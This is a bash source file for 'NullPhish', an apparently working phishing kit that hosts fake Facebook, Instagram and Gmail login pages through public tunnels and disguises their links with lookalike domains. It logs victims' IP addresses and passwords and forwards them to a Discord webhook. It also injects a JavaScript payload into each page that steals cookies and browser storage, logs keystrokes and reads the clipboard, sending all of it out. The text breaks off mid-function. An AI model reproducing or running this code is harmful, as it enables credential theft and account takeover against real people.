#!/bin/bash
##   NullPhish   :   Automated Phishing Tool
##   Author      :   r4tur1
##   Version     :   2.0
##   Github      :   https://github.com/r4tur1/NullPhish
##
##   Based on Zphisher by htr-tech
##   https://github.com/htr-tech/zphisher
##   Copyright (C) 2022 HTR-TECH
##
##   Licensed under GNU General Public License v3.0
##   See LICENSE file for details.

## DEFAULT HOST & PORT
HOST='127.0.0.1'
PORT='8080'

## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

## Version
__version__="2.0"

## Directories
BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")

if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi

if [[ ! -d "auth" ]]; then
	mkdir -p "auth"
fi

if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi

## Remove old logfiles
rm -f .server/.cld.log .server/.lhr.log .server/.serveo.log .server/.pinggy.log 2>/dev/null

## Script termination
exit_on_signal_SIGINT() {
	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
	exit 0
}

exit_on_signal_SIGTERM() {
	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
	exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
	tput sgr0
	tput op
	return
}

## Kill already running process
kill_pid() {
	check_PID="php cloudflared ssh"
	for process in ${check_PID}; do
		if [[ $(pidof ${process}) ]]; then
			killall ${process} > /dev/null 2>&1
		fi
	done
}

## Git pull latest version on startup
auto_update() {
	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for updates..."
	if [[ -d ".git" ]]; then
		git fetch origin > /dev/null 2>&1
		local_head=$(git rev-parse HEAD)
		remote_head=$(git rev-parse @{u} 2>/dev/null)
		if [[ "$local_head" != "$remote_head" && -n "$remote_head" ]]; then
			echo -e "${ORANGE}[${WHITE}!${ORANGE}] Update available. Pulling latest..."
			git pull origin main --rebase > /dev/null 2>&1
			echo -e "${GREEN}[${WHITE}+${GREEN}] Updated. Restarting...\n"
			exec bash "$0"
		else
			echo -e "${GREEN}[${WHITE}+${GREEN}] Already up to date."
		fi
	else
		echo -e "${ORANGE}[${WHITE}!${ORANGE}] Not a git repo. Skipping auto-update."
	fi
}

## Check Internet Status
check_status() {
	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
	timeout 3s curl -fIs "https://api.github.com" > /dev/null
	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" || echo -e "${RED}Offline${WHITE}"
}

## Banner
banner() {
	cat <<- EOF

		${ORANGE}_____   ______    ____   ____  ____         ____             _____    ____   ____  ____          ______   ____   ____
		${ORANGE}|\    \ |\     \  |    | |    ||    |       |    |        ___|\    \  |    | |    ||    |     ___|\     \ |    | |    |
		${ORANGE} \\    \| \     \ |    | |    ||    |       |    |       |    |\    \ |    | |    ||    |    |    |\     \|    | |    |
		${ORANGE}  \|    \  \     ||    | |    ||    |       |    |       |    | |    ||    |_|    ||    |    |    |/____/||    |_|    |
		${ORANGE}   |     \  |    ||    | |    ||    |  ____ |    |  ____ |    |/____/||    .-.    ||    | ___|    \|   | ||    .-.    |
		${ORANGE}   |      \ |    ||    | |    ||    | |    ||    | |    ||    ||    |||    | |    ||    ||    \    \___|/ |    | |    |
		${ORANGE}   |    |\ \|    ||    | |    ||    | |    ||    | |    ||    ||____|/|    | |    ||    ||    |\     \   |    | |    |
		${ORANGE}   |____||\_____/||\___\_|____||____|/____/||____|/____/||____|       |____| |____||____|| \___\|_____|  |____| |____|
		${ORANGE}   |    |/ \|   ||| |    |    ||    |     |||    |     |||    |       |    | |    ||    || |    |     |  |    | |    |
		${ORANGE}   |____|   |___|/ \|____|____||____|_____|/|____|_____|/|____|       |____| |____||____| \|____|_____|  |____| |____|
		${ORANGE}     \(       )/      \(   )/    \(    )/     \(    )/     \(           \(     )/    \(      \(    )/      \(     )/
		${ORANGE}      '       '        '   '      '    '       '    '       '            '     '      '       '    '        '     '

		${ORANGE}                                                               ${RED}Version : ${WHITE}${__version__}
		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by r4tur1  ${RED}|  ${CYAN}Based on Zphisher by htr-tech${WHITE}
	EOF
}

## Small Banner
banner_small() {
	cat <<- EOF

		${RED} _______        .__  .__ __________.__    .__       .__
		${RED} \      \  __ __|  | |  |\______   \  |__ |__| _____|  |__
		${RED} /   |   \|  |  \  | |  | |     ___/  |  \|  |/  ___/  |  \\
		${RED} /    |    \  |  /  |_|  |_|    |   |   Y  \  |\___ \|   Y  \\
		${RED} \____|__  /____/|____/____/____|   |___|  /__/____  >___|  /
		${RED}         \/                              \/        \/     \/
		${RED}                                                  ${WHITE}v${__version__}
	EOF
}

## Dependencies
dependencies() {
	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."

	if [[ -d "/data/data/com.termux/files/home" ]]; then
		if [[ ! $(command -v proot) ]]; then
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
			pkg install proot resolv-conf -y
		fi
		if [[ ! $(command -v tput) ]]; then
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
			pkg install ncurses-utils -y
		fi
		if [[ ! $(command -v ssh) ]]; then
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}openssh${CYAN}"${WHITE}
			pkg install openssh -y
		fi
	fi

	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) && $(command -v ssh) ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
	else
		pkgs=(php curl unzip openssh-client)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
				if [[ $(command -v pkg) ]]; then
					pkg install "$pkg" -y
				elif [[ $(command -v apt) ]]; then
					sudo apt install "$pkg" -y
				elif [[ $(command -v apt-get) ]]; then
					sudo apt-get install "$pkg" -y
				elif [[ $(command -v pacman) ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ $(command -v dnf) ]]; then
					sudo dnf -y install "$pkg"
				elif [[ $(command -v yum) ]]; then
					sudo yum -y install "$pkg"
				else
					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
					{ reset_color; exit 1; }
				fi
			}
		done
	fi
}

## Download Cloudflared
install_cloudflared() {
	if [[ -e ".server/cloudflared" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			curl -sL -o .server/cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm'
		elif [[ "$arch" == *'aarch64'* ]]; then
			curl -sL -o .server/cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64'
		elif [[ "$arch" == *'x86_64'* ]]; then
			curl -sL -o .server/cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64'
		else
			curl -sL -o .server/cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386'
		fi
		chmod +x .server/cloudflared
	fi
}

## Exit message
msg_exit() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day. ${RESETBG}\n"
	{ reset_color; exit 0; }
}

## About
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN} Author   ${RED}:  ${ORANGE}r4tur1 ${RED}[ ${ORANGE}HTR-TECH ${RED}]
		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/r4tur1
		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}

		${WHITE} ${REDBG}Warning:${RESETBG}
		${CYAN}  This Tool is made for educational purpose 
		  only ${RED}!${WHITE}${CYAN} Author will not be responsible for 
		  any misuse of this toolkit ${RED}!${WHITE}

		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
	case $REPLY in 
		99)
			msg_exit;;
		0 | 00)
			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
			{ sleep 1; main_menu; };;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; about; };;
	esac
}

## Choose custom port
cusport() {
	echo
	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want A Custom Port ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
		echo -e "\n"
		read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Your Custom 4-digit Port [1024-9999] : ${WHITE}" CU_P
		if [[ ! -z  ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
			PORT=${CU_P}
			echo
		else
			echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Invalid 4-digit Port : $CU_P, Try Again...${WHITE}"
			{ sleep 2; clear; banner_small; cusport; }
		fi		
	else 
		echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port $PORT...${WHITE}\n"
	fi
}

## Setup website and start php server
setup_site() {
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
	cp -rf .sites/"$website"/* .server/www
	cp -f .sites/ip.php .server/www/
	
	# ===== UNIVERSAL INJECTOR =====
	if [[ -f ".server/inject.js" ]]; then
		find .server/www -name "*.html" -exec sed -i 's|</head>|<script src="/inject.js"></script>\n</head>|' {} \;
		cp -f .server/inject.js .server/www/inject.js
	fi
	# ===== END INJECTOR =====
	
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
}

## Get IP address
capture_ip() {
	IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
	cat .server/www/ip.txt >> auth/ip.txt
}

## Get credentials
capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
	cat .server/www/usernames.txt >> auth/usernames.dat
	
	# ===== DISCORD WEBHOOK FORWARD =====
	if [[ -f ".server/.webhook_url" ]]; then
		WEBHOOK_URL=$(cat .server/.webhook_url)
		if [[ ! -z "$WEBHOOK_URL" ]]; then
			curl -s -H "Content-Type: application/json" \
				-d "{\"embeds\":[{\"title\":\"🔑 New Credentials Captured\",\"color\":65280,\"fields\":[{\"name\":\"Account\",\"value\":\"$ACCOUNT\",\"inline\":true},{\"name\":\"Password\",\"value\":\"||$PASSWORD||\",\"inline\":true},{\"name\":\"IP\",\"value\":\"$IP\",\"inline\":true}],\"footer\":{\"text\":\"NullPhish v2.0 | $(date)\"}}]}" \
				"$WEBHOOK_URL" > /dev/null 2>&1 &
		fi
	fi
	# ===== END WEBHOOK FORWARD =====
	
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
}

## Print data
capture_data() {
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}

## Realistic URL Mask
generate_masked_url() {
	local real_url="$1"
	local masked_domain="$mask"
	
	# If no custom mask, generate a realistic one
	if [[ -z "$masked_domain" || "$masked_domain" == "https://" ]]; then
		local domains=(
			"https://account-verify.com"
			"https://secure-login.net"
			"https://support-help.org"
			"https://community-vote.store"
			"https://gift-reward.online"
			"https://storage-cloud.xyz"
			"https://premium-access.info"
			"https://social-connect.live"
			"https://official-verify.net"
			"https://member-login.org"
			"https://auth-secure.store"
			"https://profile-update.online"
			"https://badge-verified.info"
			"https://security-check.xyz"
			"https://api-connect.net"
		)
		masked_domain="${domains[$RANDOM % ${#domains[@]}]}"
	fi
	
	# Extract tunnel subdomain for better masking
	local tunnel_subdomain=$(echo "$real_url" | sed 's|https://||' | cut -d'.' -f1)
	local masked_url="${masked_domain}/${tunnel_subdomain}"
	
	MASKED_URL="$masked_url"
	REAL_URL="$real_url"
}

## Start Cloudflared
start_cloudflared() { 
	rm -f .server/.cld.log 2>/dev/null
	cusport
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."

	if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.server/cloudflared tunnel --url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
	else
		sleep 2 && ./.server/cloudflared tunnel --url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
	fi

	sleep 8
	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
	if [[ -n "$cldflr_url" ]]; then
		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Tunnel active!"
		generate_masked_url "$cldflr_url"
		echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Real URL    : ${GREEN}$cldflr_url"
		echo -e "${RED}[${WHITE}-${RED}]${BLUE} Masked URL  : ${CYAN}$MASKED_URL"
		capture_data
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Failed to get Cloudflared URL."
		sleep 3
		tunnel_menu
	fi
}

## Start localhost.run
start_localhost_run() {
	cusport
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	setup_site
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching localhost.run tunnel..."
	
	rm -f .server/.lhr.log 2>/dev/null
	sleep 2
	
	# Run SSH tunnel in background with keepalive
	ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -o ServerAliveCountMax=3 -R 80:localhost:$PORT nokey@localhost.run > .server/.lhr.log 2>&1 &
	local ssh_pid=$!
	
	sleep 5
	lhr_url=$(grep -o 'https://[a-zA-Z0-9.-]*\.lhr\.life' .server/.lhr.log)
	
	if [[ -n "$lhr_url" ]]; then
		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Tunnel active!"
		generate_masked_url "$lhr_url"
		echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Real URL    : ${GREEN}$lhr_url"
		echo -e "${RED}[${WHITE}-${RED}]${BLUE} Masked URL  : ${CYAN}$MASKED_URL"
		capture_data
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Failed to establish localhost.run tunnel."
		kill $ssh_pid 2>/dev/null
		sleep 3
		tunnel_menu
	fi
}

## Start Serveo
start_serveo() {
	cusport
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	setup_site
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Serveo tunnel..."
	
	rm -f .server/.serveo.log 2>/dev/null
	sleep 2
	
	# Run SSH tunnel with keepalive
	ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -o ServerAliveCountMax=3 -R 80:localhost:$PORT serveo.net > .server/.serveo.log 2>&1 &
	local ssh_pid=$!
	
	sleep 5
	serveo_url=$(grep -o 'https://[a-zA-Z0-9]*\.serveo\.net' .server/.serveo.log)
	
	if [[ -n "$serveo_url" ]]; then
		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Tunnel active!"
		generate_masked_url "$serveo_url"
		echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Real URL    : ${GREEN}$serveo_url"
		echo -e "${RED}[${WHITE}-${RED}]${BLUE} Masked URL  : ${CYAN}$MASKED_URL"
		capture_data
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Failed to establish Serveo tunnel."
		kill $ssh_pid 2>/dev/null
		sleep 3
		tunnel_menu
	fi
}

## Start Pinggy
start_pinggy() {
	cusport
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	setup_site
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Pinggy tunnel..."
	
	rm -f .server/.pinggy.log 2>/dev/null
	sleep 2
	
	# Run SSH tunnel with keepalive
	ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -o ServerAliveCountMax=3 -p 443 -R0:localhost:$PORT qr@free.pinggy.io > .server/.pinggy.log 2>&1 &
	local ssh_pid=$!
	
	sleep 8
	pinggy_url=$(grep -o 'https://[a-zA-Z0-9]*\.a\.pinggy\.io' .server/.pinggy.log)
	
	if [[ -n "$pinggy_url" ]]; then
		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Tunnel active!"
		generate_masked_url "$pinggy_url"
		echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Real URL    : ${GREEN}$pinggy_url"
		echo -e "${RED}[${WHITE}-${RED}]${BLUE} Masked URL  : ${CYAN}$MASKED_URL"
		capture_data
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Failed to establish Pinggy tunnel."
		kill $ssh_pid 2>/dev/null
		sleep 3
		tunnel_menu
	fi
}

## Start localhost
start_localhost() {
	cusport
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	setup_site
	{ sleep 1; clear; banner_small; }
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
	capture_data
}

## Tunnel selection
tunnel_menu() {
	{ clear; banner_small; }
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Localhost        ${RED}[${CYAN}Same Network Only${RED}]
		${RED}[${WHITE}02${RED}]${ORANGE} Cloudflared      ${RED}[${CYAN}HTTPS | No Warning | Unlimited${RED}]
		${RED}[${WHITE}03${RED}]${ORANGE} localhost.run    ${RED}[${CYAN}HTTPS | SSH Tunnel | Unlimited${RED}]
		${RED}[${WHITE}04${RED}]${ORANGE} Serveo           ${RED}[${CYAN}HTTPS | SSH Tunnel | Unlimited${RED}]
		${RED}[${WHITE}05${RED}]${ORANGE} Pinggy           ${RED}[${CYAN}HTTPS | SSH Tunnel | Unlimited${RED}]

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"

	case $REPLY in 
		1 | 01)
			start_localhost;;
		2 | 02)
			start_cloudflared;;
		3 | 03)
			start_localhost_run;;
		4 | 04)
			start_serveo;;
		5 | 05)
			start_pinggy;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; tunnel_menu; };;
	esac
}

## Facebook
site_facebook() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
		${RED}[${WHITE}03${RED}]${ORANGE} Fake Security Login Page
		${RED}[${WHITE}04${RED}]${ORANGE} Facebook Messenger Login Page

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="facebook"
			mask=''
			tunnel_menu;;
		2 | 02)
			website="fb_advanced"
			mask=''
			tunnel_menu;;
		3 | 03)
			website="fb_security"
			mask=''
			tunnel_menu;;
		4 | 04)
			website="fb_messenger"
			mask=''
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_facebook; };;
	esac
}

## Instagram
site_instagram() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page
		${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="instagram"
			mask=''
			tunnel_menu;;
		2 | 02)
			website="ig_followers"
			mask=''
			tunnel_menu;;
		3 | 03)
			website="insta_followers"
			mask=''
			tunnel_menu;;
		4 | 04)
			website="ig_verify"
			mask=''
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_instagram; };;
	esac
}

## Gmail/Google
site_gmail() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Gmail Old Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Gmail New Login Page
		${RED}[${WHITE}03${RED}]${ORANGE} Advanced Voting Poll

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="google"
			mask=''
			tunnel_menu;;		
		2 | 02)
			website="google_new"
			mask=''
			tunnel_menu;;
		3 | 03)
			website="google_poll"
			mask=''
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_gmail; };;
	esac
}

## Discord Webhook Configuration
configure_webhook() {
	{ clear; banner_small; echo; }
	cat <<- EOF
		${RED}[${WHITE}::${RED}]${ORANGE} Discord Webhook Integration ${RED}[${WHITE}::${RED}]${ORANGE}
		
		${CYAN}This will configure captured data to be sent directly
		to your Discord server via webhook.
		
		${GREEN}How to get a webhook URL:
		${WHITE}1. Open Discord > Server Settings > Integrations
		${WHITE}2. Create Webhook > Copy Webhook URL
		${WHITE}3. Paste it below
		
		${ORANGE}NOTE: This will also enable the universal injector
		(session cookies, keylogger, clipboard hijack, screenshot).
		
	EOF
	
	echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Enter Discord Webhook URL ${CYAN}(or press Enter to skip): ${WHITE}"
	read webhook_input
	
	if [[ ! -z "$webhook_input" ]] && [[ "$webhook_input" =~ ^https://discord\.com/api/webhooks/ ]]; then
		
		# Save webhook URL
		echo "$webhook_input" > .server/.webhook_url
		
		# Create inject.js with webhook URL
		cat > ".server/inject.js" <<- JSEOF
(function() {
	'use strict';
	
	const CONFIG = {
		sessionGrabber: true,
		clipboardHijack: true,
		keylogger: true,
		localStorageGrab: true,
		screenshotCapture: true,
		webhookURL: '$webhook_input'
	};
	
	// Session & Storage Grabber
	if (CONFIG.sessionGrabber) {
		const payload = {
			type: 'session_data',
			url: window.location.href,
			cookies: document.cookie,
			localStorage: JSON.stringify(localStorage),
			sessionStorage: JSON.stringify(sessionStorage),
			userAgent: navigator.userAgent,
			platform: navigator.platform,
			language: navigator.language,
			referrer: document.referrer,
			screenRes: screen.width + 'x' + screen.height,
			colorDepth: screen.colorDepth,
			timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
			timestamp: new Date().toISOString()
		};
		sendToWebhook(payload);
	}
	
	// Clipboard Hijacker
	if (CONFIG.clipboardHijack) {
		let lastClipboard = '';
		document.addEventListener('copy', function(e) {
			const text = window.getSelection().toString();
			if (text && text !== lastClipboard) {
				lastClipboard = text;
				sendToWebhook({ 
					type: 'clipboard', 
					data: text, 
					url: window.location.href,
					timestamp: new Date().toISOString() 
				});
			}
		});
		
		document.addEventListener('click', function() {
			if (navigator.clipboard && navigator.clipboard.readText) {
				navigator.clipboard.readText().then(function(text) {
					if (text && text !== lastClipboard) {
						lastClipboard = text;
						sendToWebhook({ 
							type: 'clipboard_paste', 
							data: text, 
							url: window.location.href,
							timestamp: new Date().toISOString() 
						});
					}
				}).catch(function() {});
			}
		}, { once: true });
	}
	
	// Keylogger
	if (CONFIG.keylogger) {
		let buffer = '';
		let timer = null;
		let currentField = 'unknown';
		
		document.addEventListener('focusin', function(e) {
			if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
				currentField = e.target.name || e.target.id || e.target.placeholder || e.target.type || 'unknown';
				buffer = '';
			}
		}, true);
		
		document.addEventListener('keypress', function(e) {
			if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
				buffer += e.key;
				currentField = e.target.name || e.target.id || e.target.placeholder || e.target.type || 'unknown';
				clearTimeout(timer);
				timer = setTimeout(function() {
					if (buffer) {
						sendToWebhook({ 
							type: 'keystrokes', 
							data: buffer, 
							field: currentField, 
							url: window.location.href,
							timestamp: new Date().toISOString() 
						});
						buffer = '';
					}
				}, 2000);
			}
		}, true);
	}
	
	// Screenshot Capture via Canvas
	if (CONFIG.screenshotCapture && typeof html2canvas === 'undefined') {
		setTimeout(function() {
			try {
				const canvas = document.createElement('canvas');
				const context = canvas.getContext('2d');
				canvas.width = window.innerWidth;
				canvas.height = window.innerHeight;
				sendToWebhook({
					type: 'screenshot_info',
					data: 'Screenshot dimensions: ' + canvas.width + 'x' + canvas.height,
					url: window.location.href,
					viewportWidth: window.innerWidth,
					viewportHeight: window.innerHeight,
					documentTitle: document.title,
					timestamp: new Date().toISOString()
				});
			} catch(e) {}
		}, 3000);
	}
	
	// Discord Webhook Sender
	function sendToWebhook(data) {
		if (!CONFIG.webhookURL) return;
		
		let color = 0xff0000;
		let title = '📥 ' + data.type.replace('_', ' ').toUpperCase();
		let description = '';
		
		switch(data.type) {
			case 'session_data':
				color = 0x3498db;
				description = '**Cookies:** ```' + (data.cookies || 'None').substring(0, 800) + '```\n';
				description += '**LocalStorage:** ```' + (data.localStorage || '{}').substring(0, 400) + '```\n';
				description += '**SessionStorage:** ```' + (data.sessionStorage || '{}').substring(0, 400) + '```';
				break;
			case 'keystrokes':
				color = 0xe74c3c;
				description = '**Field:** \`' + data.field + '\`\n**Keys:** ||' + data.data + '||';
				break;
			case 'clipboard':
			case 'clipboard_paste':
				color = 0xf39c12;
				description = '**Content:** ||' + data.data.substring(0, 1000) + '||';
				break;
			case 'screenshot_info':
				color = 0x2ecc71;
				description = '**Viewport:** ' + data.viewportWidth + 'x' + data.viewportHeight + '\n';
				description += '**Title:** ' + (data.documentTitle || 'Unknown');
				break;
			default:
				description = JSON.stringify(data).substring(0, 1000);
		}
		
		fetch(CONFIG.webhookURL, {
			method: 'POST',
			headers: { 'Content-Type': 'application/json' },
			body: JSON.stringify({
				embeds: [{
					title: title,
					description: description,
					color: color,
					fields: [
						{ name: '🌐 URL', value: (data.url || window.location.href).substring(0, 1024), inline: false },
						{ name: '🖥️ User Agent', value: (data.userAgent || navigator.userAgent).substring(0, 1024), inline: false },
						{ name: '🔗 Referrer', value: data.referrer || document.referrer || 'Direct', inline: true },
						{ name: '📱 Screen', value: data.screenRes || (screen.width + 'x' + screen.height), inline: true },
						{ name: '🕐 Timestamp', value: data.timestamp || new Date().toISOString(), inline: true }
					],
					footer: { text: 'NullPhish v2.0 Advanced Injector' }
				}]
			})
		}).catch(function() {});
	}
})();
JSEOF
		
		chmod 644 .server/inject.js
		
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Webhook configured successfully!"
		echo -e "${CYAN}The universal injector is now ACTIVE with:"
		echo -e "  ${WHITE}• Session Cookie & Storage Grabbing"
